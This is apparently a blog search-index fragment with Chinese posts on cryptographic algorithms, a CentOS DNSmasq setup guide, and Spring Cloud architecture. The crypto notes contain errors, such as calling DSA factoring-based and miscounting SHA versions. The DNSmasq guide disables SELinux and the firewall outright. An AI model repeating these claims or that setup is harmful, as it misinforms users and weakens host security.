title=\"国密SM4\"></a>国密SM4</h2><p>SM4为对称加密。来源于无线局域网标准的分组数据算法，密钥长度和分组长度均为128位。</p>\n<p>SM4分组密码算法是我国自主设计的分组对称密码算法，用于实现数据的加密&#x2F;解密运算，以保证数据和信息的机密性。要保证一个对称密码算法的安全性的基本条件是其具备足够的密钥长度，SM4算法与AES算法具有相同的密钥长度分组长度128比特，因此在安全性上高于3DES算法。</p>\n<hr>\n<h2 id=\"附录1-非对称密钥的加密系统\"><a href=\"#附录1-非对称密钥的加密系统\" class=\"headerlink\" title=\"附录1: 非对称密钥的加密系统\"></a>附录1: 非对称密钥的加密系统</h2><p>根据密钥类型不同将现代密码技术分为两类：对称加密算法和非对称加密算法。<br>非对称密钥加密系统采用的加密钥匙（公钥）和解密钥匙（私钥）是不同的。<br>常见的非对称加密算法如下：</p>\n<h3 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h3><p>由 RSA 公司发明，安全性依赖于大数分解，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的；</p>\n<h3 id=\"ECC\"><a href=\"#ECC\" class=\"headerlink\" title=\"ECC\"></a>ECC</h3><p>ECC（Elliptic Curves Cryptography）：椭圆曲线密码编码学。</p>\n<h3 id=\"DSA\"><a href=\"#DSA\" class=\"headerlink\" title=\"DSA\"></a>DSA</h3><p>DSA（Digital Signature Algorithm）：数字签名算法，是一种标准的 DSS（数字签名标准）。</p>\n<ul>\n<li>DSA和RSA的基本原理都是大数分解，其安全性略高于与RSA，区别在于RSA的两个素数公开，这样，当使用别人的p和q时，即使不知道私钥，你也能确认它们是否是随机产生的，还是作了手脚，RSA算法却作不到。</li>\n<li>DSA只是一种算法，和RSA不同之处在于它不能用作加密和解密，也不能进行密钥交换，只用于签名,它比RSA要快很多.</li>\n</ul>\n<hr>\n<h2 id=\"附录2-对称密钥的加密系统\"><a href=\"#附录2-对称密钥的加密系统\" class=\"headerlink\" title=\"附录2: 对称密钥的加密系统\"></a>附录2: 对称密钥的加密系统</h2><h3 id=\"DES\"><a href=\"#DES\" class=\"headerlink\" title=\"DES\"></a>DES</h3><p>1977年1月，美国政府采纳IBM公司设计的方案作为非机密数据的正式数据加密标准（DES Data Encryption Standard) 。</p>\n<p>目前在国内，随着三金工程尤其是金卡工程的启动，DES算法在POS、ATM、磁卡及智能卡（IC卡）、加油站、高速公路收费站等领域被广泛应用，以此来实现关键数据的保密，如信用卡持卡人的PIN的加密传输，IC卡与POS间的双向认证、金融交易数据包的MAC校验等，均用到DES算法。</p>\n<p>DES算法的入口参数有三个：Key、Data、Mode</p>\n<ul>\n<li>Key为8个字节共64位，是DES算法的工作密钥；</li>\n<li>Data也为8个字节64位，是要被加密或被解密的数据；</li>\n<li>Mode为DES的工作方式，有两种：加密或解密。</li>\n</ul>\n<p>DES算法是这样工作的：</p>\n<ul>\n<li>如Mode为加密，则用Key 去把数据Data进行加密， 生成Data的密码形式（64位）作为DES的输出结果；</li>\n<li>如Mode为解密，则用Key去把密码形式的数据Data解密，还原为Data的明码形式（64位）作为DES的输出结果。</li>\n<li>在通信网络的两端，双方约定一致的Key，在通信的源点用Key对核心数据进行DES加密，然后以密码形式在公共通信网（如电话网）中传输到通信网络的终点，数据到达目的地后，用同样的Key对密码数据进行解密，便再现了明码形式的核心数据。这样，便保证了核心数据（如PIN、MAC等）在公共通信网中传输的安全性和可靠性。</li>\n</ul>\n<p>通过定期在通信网络的源端和目的端同时改用新的Key，便能更进一步提高数据的保密性，这正是现在金融交易网络的流行做法。</p>\n<h3 id=\"3DES\"><a href=\"#3DES\" class=\"headerlink\" title=\"3DES\"></a>3DES</h3><p>3DES是DES加密算法的一种模式，它使用3条64位的密钥对数据进行三次加密。数据加密标准（DES）是美国的一种由来已久的加密标准，它使用对称密钥加密法。</p>\n<p>3DES（即Triple DES）是DES向AES过渡的加密算法（1999年，NIST将3-DES指定为过渡的加密标准），是DES的一个更安全的变形。它以DES为基本模块，通过组合分组方法设计出分组加密算法。</p>\n<p>设Ek()和Dk()代表DES算法的加密和解密过程，K代表DES算法使用的密钥，P代表明文，C代表密表，这样，</p>\n<ul>\n<li><p>3DES加密过程为：C&#x3D;Ek3(Dk2(Ek1(P)))</p>\n</li>\n<li><p>3DES解密过程为：P&#x3D;Dk1((EK2(Dk3(C)))</p>\n</li>\n<li><p>K1、K2、K3决定了算法的安全性，若三个密钥互不相同，本质上就相当于用一个长为168位的密钥进行加密。多年来，它在对付强力攻击时是比较安全的。若数据对安全性要求不那么高，K1可以等于K3。在这种情况下，密钥的有效长度为112位。</p>\n</li>\n</ul>\n<h3 id=\"AES\"><a href=\"#AES\" class=\"headerlink\" title=\"AES\"></a>AES</h3><p>AES(Advanced Encryption Standard)：高级加密标准，是下一代的加密算法标准，速度快，安全级别高。</p>\n<p>用AES加密2000年10月，NIST（美国国家标准和技术协会）宣布通过从15种候选算法中选出的一项新的密匙加密标准。Rijndael被选中成为将来的 AES。Rijndael是在1999年下半年，由研究员Joan Daemen 和 Vincent Rijmen 创建的。AES正日益成为加密各种形式的电子数据的实际标准。</p>\n<p>美国标准与技术研究院（NIST）于2002年5月26日制定了新的高级加密标准（AES）规范。</p>\n<p>AES算法基于排列和置换运算。排列是对数据重新进行安排，置换是将一个数据单元替换为另一个。</p>\n<p>AES使用几种不同的方法来执行排列和置换运算。AES是一个迭代的、对称密钥分组的密码，它可以使用128、192和256位密钥，并且用128位（16字节）分组加密和解密数据。</p>\n<p>与公共密钥加密使用密钥对不同，对称密钥密码使用相同的密钥加密和解密数据。通过分组密码返回的加密数据的位数与输入数据相同。迭代加密使用一个循环结构，在该循环中重复置换和替换输入数据。</p>\n<h2 id=\"附录3-数字摘要\"><a href=\"#附录3-数字摘要\" class=\"headerlink\" title=\"附录3: 数字摘要\"></a>附录3: 数字摘要</h2><h3 id=\"MD5\"><a href=\"#MD5\" class=\"headerlink\" title=\"MD5\"></a>MD5</h3><p>MD5（Message-Digest Algorithm 5，信息摘要算法第5版）是计算机广泛使用的散列算法（也称“哈希算法”或“杂凑算法”）之一，采用带密钥的运算时，可同时用于消息完整性检测和消息源身份认证。它是由MD2、MD3和MD4版本一路发展而来，是Ronald Rivest 于1991年设计发布的，用于取代MD4。</p>\n<ul>\n<li>MD算法的基本工作机制：</li>\n</ul>\n<p>先在发送端将一个随机长度的消息，经过一系列的各种逻辑运算，以打乱原始消息的次序，生成一个128位的消息摘要（也称哈希值），并随着原始消息一起发送。</p>\n<p>原始消息，连同摘要消息一起到了接收端后，再采用相同的方法对所接收到的原始消息进行“压缩”，看生成的消息摘要是否与随着原始消息一起发送过来的消息摘要一致，一致则认为所接收的消息是完整的，在传输途中没有被非法篡改。</p>\n<ul>\n<li><p>对于带密钥的MD5消息摘要，不是直接基于原始消息进行计算的，还要与机密的预共享密钥（采用预共享密钥认证方法时），或者本端的公钥（采用数字证书认证方法时）结合起来计算的，而预共享密钥和本端公钥只有发送者和接收者才知道的，所以能保证摘要计算的机密性，产生独一无二的“数字指纹”，起到了消息源身份认证的目的。</p>\n</li>\n<li><p>MD5摘要运算是不可逆的（即具有单向性，也称之为“单向密钥”），不可通过摘要消息还原出原始的消息。当然，其实所有身份认证算法都是这样的，仅用于认证，不需要在接收端进行数据还原。也正因为如此，MD5算法通常不认为是一种加密算法，不具有解密能力。</p>\n</li>\n<li><p>MD5算法的主要应用于各种三层VPN通信的数据完整性验证和消息源身份认证外，也经常用于数字签名。</p>\n</li>\n</ul>\n<p>如我们常常在某些软件下载站点的某软件信息中看到其MD5值，它的作用就是用于在我们下载该软件后对下载回来的文件用专门的软件（如Windows MD5 Check等）做一次MD5校验，以确保我们获得的文件与该站点提供的文件为同一文件。利用MD5算法来进行文件校验的方案被大量应用到软件下载站、论坛数据库、系统文件安全等方面。</p>\n<p>另外，MD5还广泛用于操作系统的登陆验证上，如UNIX、各类BSD系统登录密码、数字签名等诸多方。如在UNIX系统中用户的密码是以MD5（或其他类似的算法）经Hash运算后存储在文件系统中。当用户登录的时候，系统把用户输入的密码进行MD5 Hash运算，然后再去和保存在文件系统中的MD5值进行比较，进而确定输入的密码是否正确。通过这样的步骤，系统在并不知道用户密码的明码的情况下就可以确定用户登录系统的合法性。避免用户的密码被具有系统管理员权限的用户知道。</p>\n<h3 id=\"SHA\"><a href=\"#SHA\" class=\"headerlink\" title=\"SHA\"></a>SHA</h3><p>SHA（Secure Hash Algorithm，安全哈希算法）主要适用于数字签名，也是一种不可逆的MAC算法，但比MD5算法更加安全。</p>\n<ul>\n<li><p>目前它有三种主要的版本，即SHA-0、SHA-1、SHA-2和SHA-3。<br>其中SHA-2和SHA-3版本中又有多种不同子分类，如在SHA-2中又根据它们最终所生成的摘要消息长度的不同又包括SHA-224、SHA-256、SHA-384和SHA-512等几种。</p>\n</li>\n<li><p>SHA算法的认证原理与前面介绍的MD5算法认证原理完全一致。</p>\n</li>\n<li><p>各种版本SHA算法的区别在于，进行散列运算时所涉及的一些参数特性不完全相同</p>\n</li>\n</ul>\n"},{"title":"基于DNSmasq构建本地DNS服务器","url":"/2020/07/05/%E5%9F%BA%E4%BA%8EDNSmasq%E6%9E%84%E5%BB%BA%E6%9C%AC%E5%9C%B0DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"<h2 id=\"本地网络规划方案\"><a href=\"#本地网络规划方案\" class=\"headerlink\" title=\"本地网络规划方案\"></a>本地网络规划方案</h2><p>为了解决KX上网的问题，经常需要修改DNS设置，干脆就在自己的局域网搭建一个本地DNS服务器，作为今后Linux系统安装的基础设施，一劳永逸解决问题。</p>\n<p>局域网Domain：  caogo.lan<br>DNS服务器：     192.168.0.144， dnsmasq, dnsmasq.caogo.lan</p>\n<p>原本想用BIND（named），虽然功能强大但是安装配置太复杂，研究发现局域网直接用DNSmasq最合适。<br>另外，局域网的Domain本来考虑<code>.local</code>，但发现Mac的Banjour服务默认使用了该域名后缀</p>\n<blockquote>\n<p>Bonjour服务是基于mDNS(Multicast DNS)协议实现的，mDNS协议适用于局域网内的设备通过组播的方式交互DNS记录来完成域名解析，约定的组播地址是：224.0.0.251，端口号是5353，mdns协议使用DNS协议一样的报文格式。详细资料见参考目录</p>\n</blockquote>\n<h2 id=\"DNSmasq概述\"><a href=\"#DNSmasq概述\" class=\"headerlink\" title=\"DNSmasq概述\"></a>DNSmasq概述</h2><p>DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能（本案不使用，核心AR路由器负责DHCP）。</p>\n<p>它服务那些只在本地适用的域名，这些域名是不会在全球的DNS服务器中出现的。DHCP服务器和DNS服务器结合，并且允许DHCP分配的地址能在DNS中正常解析，而这些DHCP分配的地址和相关命令可以配置到每台主机中，也可以配置到一台核心设备中（比如路由器），DNSmasq支持静态和动态两种DHCP配置方式。</p>\n<h2 id=\"DNS服务器的配置步骤\"><a href=\"#DNS服务器的配置步骤\" class=\"headerlink\" title=\"DNS服务器的配置步骤\"></a>DNS服务器的配置步骤</h2><ol>\n<li><p>安装操作系统后，找到网卡参数文件并设置静态IP地址130（必须的），至少包含以下参数：BOOTPROTO、ONBOOT、IPADDR、NETMASK、GATEWAY。<br>然后，激活该网络配置<code>systemctl restart network</code>并确认成功联网。</p>\n</li>\n<li><p>刚装好的Centos必须马上关闭firewalld，否则后面虽然netestat显示53端口开放，但是外网死活就访问不了<br>为了后续yum安装访问Internet，临时设置域名服务器安装必要的基础网络工具。</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 赶紧关闭防火墙</span></span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27;</span> /etc/sysconfig/selinux</span><br><span class=\"line\">setenforce 0</span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> firewalld</span><br><span class=\"line\">systemctl stop firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为安装工具软件，临时设置DNS</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/resolv.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">nameserver 8.8.8.8</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">yum install dnsmasq net-tools bind-utils yum-utils tree -y</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>定义DNSmasq核心配置文件<code>/etc/dnsmasq.conf</code></p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> /etc/dnsmasq.conf /etc/dnsmasq.conf.orig</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/dnsmasq.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">listen-address=127.0.0.1, 192.168.0.144</span></span><br><span class=\"line\"><span class=\"string\">expand-hosts</span></span><br><span class=\"line\"><span class=\"string\">domain=caogo.local</span></span><br><span class=\"line\"><span class=\"string\">server=8.8.8.8</span></span><br><span class=\"line\"><span class=\"string\">server=114.114.114.114</span></span><br><span class=\"line\"><span class=\"string\">address=/caogo.local/127.0.0.1</span></span><br><span class=\"line\"><span class=\"string\">address=/caogo.local/192.168.0.144</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>导入本地域名解析文件<code>/etc/hosts</code>，先定义这些hosts，以后要增加就编辑这个文件</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt;&gt; /etc/hosts &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">127.0.0.1       dnsmasq</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.1     gateway</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.5     ap</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.8     proxy</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.11    plc</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">192.168.0.132   pve01 pve</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">192.168.0.120   nfs</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.140   ntp</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.144   dnsmasq dns ns01 ns02</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.148   mirror yum</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">192.168.0.210   master1</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.212   worker1</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：在PVE虚拟机中，Cloud-init启动会修改<code>/etc/hosts</code>，解决办法是修改 <code>/etc/cloud/cloud.cfg</code>，注释其中的<code>update_etc_hosts</code>字段</p>\n</blockquote>\n</li>\n<li><p>最关键的一步：编辑域名解析核心配置文件<code>/etc/resolv.conf</code></p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/resolv.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># set localhost as the unique namserver</span></span><br><span class=\"line\"><span class=\"string\">nameserver  127.0.0.1</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置运行环境等</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 禁止修改配置文件，以防止NetworkManger等默默修改域名解析配置</span></span><br><span class=\"line\">chattr +i /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置开机自启动</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> dnsmasq</span><br><span class=\"line\">systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>确认DNS解析服务运行正常</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]<span class=\"comment\"># netstat -tunpl |grep 53</span></span><br><span class=\"line\">tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      9863/dnsmasq</span><br><span class=\"line\">tcp6       0      0 :::53                   :::*                    LISTEN      9863/dnsmasq</span><br><span class=\"line\">udp        0      0 0.0.0.0:53              0.0.0.0:*                           9863/dnsmasq</span><br><span class=\"line\">udp6       0      0 :::53                   :::*                                9863/dnsmasq  </span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"如何使用DNS公共服务\"><a href=\"#如何使用DNS公共服务\" class=\"headerlink\" title=\"如何使用DNS公共服务\"></a>如何使用DNS公共服务</h2><p>在局域网中，为每台服务器的<code>/etc/resolv.conf</code>中设置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># domain caogo.local</span><br><span class=\"line\">nameserver 192.168.0.144</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在创建虚拟机时，cloudinit 将通过 DHCP 获取网络配置，从而修改 &#x2F;etc&#x2F;resolv.conf 文件，为此建议模版中将该文件设置为不可修改，方法是 <code>chattr +i /etc/resolv.conf</code></p>\n</blockquote>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://wiki.archlinux.org/index.php/Dnsmasq#DNS_addresses_file_and_forwarding\">Dnsmasq的官方网站</a></li>\n<li><a href=\"https://www.howtoing.com/setup-a-dns-dhcp-server-using-dnsmasq-on-centos-rhel\">Dnsmasq配置的核心参考文档</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1174717\">DNSmasq详细解析及详细配置-腾讯云</a></li>\n<li><a href=\"https://www.kclouder.cn/centos-7-dns-bind/\">CentOS 7 安装配置本地DNS (BIND) 服务器（Master-Slave）</a></li>\n<li><a href=\"https://wiki.archlinux.org/index.php/BIND\">BIND的官方网站</a></li>\n<li><a href=\"https://blog.csdn.net/yueqian_scut/article/details/52694411\">局域网设备发现之Bonjour协议</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Multicast_DNS\">RFC-6762</a></li>\n</ul>\n"},{"title":"基于Spring Cloud的微服务架构分析","url":"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/","content":"<p>Spring Cloud是一个相对比较新的微服务框架，2016年才推出1.0的release版本. 虽然Spring Cloud时间最短, 但是相比Dubbo等RPC框架, Spring Cloud提供的全套的分布式系统解决方案。</p>\n<p>Spring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。</p>\n<p>Spring并没有重复制造轮子，它只是将目前各家公司(主要是 Netflix )开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p>\n<img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/infra.png\" class=\"\" title=\"SpringCloud的核心组件\">\n\n<h2 id=\"Spring-Cloud-的核心组件\"><a href=\"#Spring-Cloud-的核心组件\" class=\"headerlink\" title=\"Spring Cloud 的核心组件\"></a>Spring Cloud 的核心组件</h2><h3 id=\"1-Eureka（注册中心）\"><a href=\"#1-Eureka（注册中心）\" class=\"headerlink\" title=\"1. Eureka（注册中心）\"></a>1. Eureka（注册中心）</h3><p>Eureka 是 Spring Cloud 微服务架构中的注册中心，专门负责服务的注册与发现,里面有一个注册表,保存了各个服务器的 机器和端口。</p>\n<ul>\n<li><p><code>Eureka服务端</code>：也称服务注册中心，同其他服务注册中心一样，支持高可用配置。如果Eureka以集群模式部署，当集群中有分片出现故障时，那么Eureka就转入自我保护模式。它允许在分片故障期间继续提供服务的发现和注册，当故障分片恢复运行时，集群中其他分片会把它们的状态再次同步回来</p>\n</li>\n<li><p><code>Eureka客户端</code>：主要处理服务的注册与发现。客户端服务通过注解和参数配置的方式，嵌入在客户端应用程序的代码中，在应用程序运行时，Eureka客户端想注册中心注册自身提供的服务并周期性地发送心跳来更新它的服务租约。同时，它也能从服务端查询当前注册的服务信息并把它们缓存到本地并周期性地刷新服务状态</p>\n</li>\n</ul>\n<p>Eureka Server 的高可用实际上就是将自己作为服务向其他注册中心注册自己，这样就可以形成一组互相注册的服务注册中心，以实现服务清单的互相同步，达到高可用效果。</p>\n<h3 id=\"2-Zuul（服务网关）\"><a href=\"#2-Zuul（服务网关）\" class=\"headerlink\" title=\"2. Zuul（服务网关）\"></a>2. Zuul（服务网关）</h3><p>Zuul网关负责转发请求给对应的服务，这个组件是负责网络路由的。</p>\n<p>Spring Cloud Zuul通过与Spring Cloud Eureka进行整合，将自身注册为Eureka服务治理下的应用，同时从Eureka中获得了所有其他微服务的实例信息</p>\n<p>对于路由规则的维护，Zuul默认会将通过以服务名作为ContextPath的方式来创建路由映射</p>\n<p>Zuul提供了一套过滤器机制，可以支持在API网关无附上进行统一调用来对微服务接口做前置过滤，已实现对微服务接口的拦截和校验</p>\n<h3 id=\"3-Ribbon（负载均衡）\"><a href=\"#3-Ribbon（负载均衡）\" class=\"headerlink\" title=\"3. Ribbon（负载均衡）\"></a>3. Ribbon（负载均衡）</h3><p>提供云端负载均衡，有多种负载均衡策略可供选择，可配合服务发现和断路器使用。</p>\n<p>Ribbon是一个基于HTTP和TCP的客户端负载均衡器，它可以在通过客户端中配置的<code>ribbonServerList</code>服务端列表去轮询访问以达到服务均衡的作用。</p>\n<p>当Ribbon和Eureka联合使用时，Ribbon的服务实例清单<code>RibbonServerList</code>会被<code>DiscoveryEnabledNIWSServerList</code>重写，扩展成从Eureka注册中心中获取服务端列表。同时它也会用<code>NIWSDiscoveryPing</code>来取代IPing，它将职责委托给Eureka来去定服务端是否已经启动</p>\n<p>在客户端负载均衡中，所有客户端节点都维护着自己要访问的服务端清单，而这些服务端的清单来自于服务注册中心（比如Eureka）。在客户端负载均衡中也需要心跳去维护服务端清单的健康性，只是这个步骤需要与服务注册中心配合完成。</p>\n<p>通过Spring Cloud Ribbon的封装，我们在微服务架构中使用客户端负载均衡调用只需要如下两步：</p>\n<ul>\n<li>服务提供者只需要启动多个服务实例并且注册到一个注册中心或是多个相关联的服务注册中心</li>\n<li>服务消费者直接通过调用被@LoadBalanced注解修饰过的RestTemplate来实现面向服务的接口调用</li>\n</ul>\n<h3 id=\"4-Hystrix（熔断保护器）\"><a href=\"#4-Hystrix（熔断保护器）\" class=\"headerlink\" title=\"4. Hystrix（熔断保护器）\"></a>4. Hystrix（熔断保护器）</h3><p>熔断器，容错管理工具，旨在通过熔断机制控制服务和第三方库的节点,从而对延迟和故障提供更强大的容错能力。<br>提供线程池不同的服务走不同的线程池，实现了不同服务调用的隔离，避免了服务器雪崩的问题。</p>\n<p>在微服务架构中，存在着那么多的服务单元，若一个单元出现故障，就很容易因依赖关系而引发故障的蔓延，最终导致整个系统的瘫痪，这样的架构相较传统架构更加不稳定。为了解决这样的问题，产生了断路器等一系列的服务保护机制</p>\n<p>在分布式架构中，当某个服务单元发生故障之后，通过断路器的故障监控，向调用方返回一个错误响应，而不是长时间的等待。这样就不会使得线程因调用故障服务被长时间占用不释放，避免了故障在分布式系统中的蔓延</p>\n<p>Hystrix具备服务降级、服务熔断、线程和信号隔离、请求缓存、请求合并以及服务监控等强大功能</p>\n<p>Hystrix使用舱壁模式实现线程池的隔离，它会为每一个依赖服务创建一个独立的线程池，这样就算某个依赖服务出现延迟过高的情况，也只是对该依赖服务的调用产生影响，而不会拖慢其他的依赖服务</p>\n<h3 id=\"5-Feign（REST转换器）\"><a href=\"#5-Feign（REST转换器）\" class=\"headerlink\" title=\"5. Feign（REST转换器）\"></a>5. Feign（REST转换器）</h3><p>基于动态代理机制，根据注解和选择的机器，拼接请求url地址，发起请求。Feign的关键机制是使用了动态代理</p>\n<ul>\n<li>首先，对某个接口定义了@FeignClient注解，Feign就会针对这个接口创建一个动态代理</li>\n<li>接着调用接口的时候，本质就是调用Feign创建的动态代理</li>\n<li>Feign的动态代理会根据在接口上的@RequestMapping等注解，来动态构造要请求的服务的地址</li>\n<li>针对这个地址，发起请求、解析响应</li>\n</ul>\n<p>Feign是和Ribbon以及Eureka紧密协作的</p>\n<ul>\n<li>首先Ribbon会从Eureka Client里获取到对应的服务注册表，也就知道了所有的服务都部署在了哪些机器上，在监听哪些端口</li>\n<li>然后Ribbon就可以使用默认的Round Robin算法，从中选择一台机器</li>\n<li>Feign就会针对这台机器，构造并发起请求</li>\n</ul>\n<h3 id=\"6-Config（分布式配置）\"><a href=\"#6-Config（分布式配置）\" class=\"headerlink\" title=\"6. Config（分布式配置）\"></a>6. Config（分布式配置）</h3><p>配置管理工具包，让你可以把配置放到远程服务器，集中化管理集群配置，目前支持本地存储、Git以及Subversion。</p>\n<h2 id=\"注册中心与API网关的分析\"><a href=\"#注册中心与API网关的分析\" class=\"headerlink\" title=\"注册中心与API网关的分析\"></a>注册中心与API网关的分析</h2><p>微服务网关更多是在前后端分离，或者说涉及到独立的类似手机APP等前端应用的时候使用的最多，即把内部各个微服务组件模块的API接口能力统一注册和接入到网关，对于APP也只需要访问网关暴露的接口即可，同时通过网关还可以进一步的实现安全隔离。</p>\n<p>也就是说在这种场景下，网关更多的是实现了接口服务的代理和路由转发能力，更多的是向外的一种能力发布。</p>\n<ol>\n<li><p>一个独立的开发团队，为保证独立自治，以及内部多个微服务模块间的交互集成，最好启用独立的服务注册中心实现服务注册，发现能力。即开发团队内部多个微服务模块间的集成，不需要通过网关，只需要通过服务注册中心进行集成即可。</p>\n</li>\n<li><p>开发团队需要暴露能力给外部，包括暴露能力给其它的开发团队，需要考虑将该API接口注册到外部的网关上。在这里建议是拆分两个独立网关，一个是内部API网关，一个是放置到DMZ区面对公网访问的API网关。对于服务如果同时涉及到内部和外部使用，则两边注册。建议不要通过两次网关去路由，一个是影响性能，一个是不方便后续问题排查。</p>\n</li>\n<li><p>构建在开发团队之外的API网关必须具备负载均衡能力，可以配置多个IP地址。通过该API网关也最好具备和Docker容器扩展后的服务自动注册和地址加入扩展能力。</p>\n</li>\n</ol>\n<img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/apis.jpg\" class=\"\" title=\"多注册中心的模型\">\n\n<hr>\n<h2 id=\"Eureka-的竞品分析：Nacos、ZooKeeper、Etcd\"><a href=\"#Eureka-的竞品分析：Nacos、ZooKeeper、Etcd\" class=\"headerlink\" title=\"Eureka 的竞品分析：Nacos、ZooKeeper、Etcd\"></a>Eureka 的竞品分析：Nacos、ZooKeeper、Etcd</h2><p>服务发现是一个古老的话题，当应用开始脱离单机运行和访问时，服务发现就诞生了。目前的网络架构是每个主机都有一个独立的IP地址，那么服务发现基本上都是通过某种方式获取到服务所部署的IP地址。DNS协议是最早将一个网络名称翻译为网络IP的协议，在最初的架构选型中，DNS+LVS+Nginx基本可以满足所有的RESTful服务的发现，此时服务的IP列表通常配置在Nginx或者LVS。后来出现了RPC服务，服务的上下线更加频繁，人们开始寻求一种能够支持动态上下线并且推送IP列表变化的注册中心产品。</p>\n<img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/vs.png\" class=\"\" title=\"不同的微服务注册中心\">\n\n<h3 id=\"Eureka\"><a href=\"#Eureka\" class=\"headerlink\" title=\"Eureka\"></a>Eureka</h3><ul>\n<li>Spring Cloud Eureka所选择的是AP，采用的是去中心化结构，放弃了强一致性。也就是说Eureka集群中的各个结点都是平等的，没有主从的概念。通过互相注册的方式来进行消息同步和保证高可用。并且一个Eureka Server结点挂掉了，还有其他同等的结点来提供服务，并不会引发服务的中断</li>\n<li>Eureka只能当注册中心，想搞配置中心的话，还得搭配Spring Cloud Config+Spring Cloud Bus。其中后者支持Rabbiimq和Kafka两种模式。</li>\n<li>使用Java语言来开发的，并且也是Spring Cloud的子项目，所以可以直接通过引入jar包的方式来集成Eureka，这点非常方便</li>\n</ul>\n<h3 id=\"1-ZooKeeper\"><a href=\"#1-ZooKeeper\" class=\"headerlink\" title=\"1. ZooKeeper\"></a>1. ZooKeeper</h3><p>这是一款经典的服务注册中心产品（虽然它最初的定位并不在于此），在很长一段时间里，它是国人在提起RPC服务注册中心时心里想到的唯一选择，这很大程度上与Dubbo在中国的普及程度有关。</p>\n<ul>\n<li>Apache Zookeeper所选择的是CP，也就是放弃了高可用性。Zookeeper集群在进行消息同步的时候，必须有一半以上结点完成了同步才会返回；而当Master结点挂了或者集群中有过半的结点不能工作了，此时就会触发故障恢复，重新进行Master选举。在这个过程中，整个Zookeeper集群无法对外提供服务，从而实去了A（可用性）</li>\n<li>为了达到C，Zookeeper采用的是自己的ZAB协议。</li>\n</ul>\n<h3 